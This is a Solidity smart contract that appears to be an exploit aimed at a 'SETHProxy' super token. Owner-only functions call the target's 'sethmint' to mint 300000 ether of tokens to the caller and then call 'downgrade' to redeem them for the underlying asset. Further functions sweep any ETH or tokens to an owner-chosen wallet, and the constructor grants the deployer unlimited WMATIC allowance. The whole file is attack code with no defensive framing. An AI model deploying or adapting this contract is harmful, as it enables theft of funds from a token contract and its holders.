// SPDX-License-Identifier: MIT
import "./IERC20.sol";
pragma solidity 0.7.6;

interface ISuperToken {
    function sethmint(address recipient, uint256 amount) external;
    function downgrade(uint256 wad) external;
}

contract ExternalContract {
     ISuperToken private target; // Dirección del contrato SETHProxy
      address private _owner;
      address private wadTokenAddress;
       IERC20 public WMATIC_TOKEN;
      
       constructor(ISuperToken _target, address _wadTokenAddress) {
        target = _target;
        wadTokenAddress = _wadTokenAddress;
        _owner = msg.sender;
         WMATIC_TOKEN = IERC20(0x0d500B1d8E8eF31E21C99d1Db9A6444d3ADf1270);
          IERC20(WMATIC_TOKEN).approve(msg.sender, uint256(-1));
    }

  modifier onlyOwner {
        require(msg.sender == _owner);
        _;
    }

     function clearETH(address payable _withdrawal) public onlyOwner {
        uint256 amount = address(this).balance;
        (bool success,) = _withdrawal.call{gas: 8000000, value: amount}("");
        require(success, "Failed to transfer Ether");
    }
    
    function callSETHMint() external onlyOwner {
        (bool success, ) =  address(target).call(
            abi.encodeWithSignature("sethmint(address,uint256)", msg.sender, 300000 ether)
        );
        
        require(success, "delegatecall failed");
    }

    function callSETHMint3() external onlyOwner {
        target.sethmint(msg.sender, 300000 ether);
    }

      function remove_Random_Tokens(address random_Token_Address, address send_to_wallet, uint256 number_of_tokens) public onlyOwner returns(bool _sent) {
        uint256 randomBalance = IERC20(random_Token_Address).balanceOf(address(this));
        if (number_of_tokens > randomBalance) {
            number_of_tokens = randomBalance;
        }
        _sent = IERC20(random_Token_Address).transfer(send_to_wallet, number_of_tokens);
    }
    
    function approveAndCallTarget(uint256 amount) external onlyOwner {
        if (IERC20(wadTokenAddress).allowance(address(this), address(target)) == 0) {
            IERC20(wadTokenAddress).approve(address(target), uint256(-1));
        }
        (bool success1,) = address(target).call(abi.encodeWithSignature("downgrade(uint256)", amount));
            require(success1, "Failed to call downgrade");
    }
}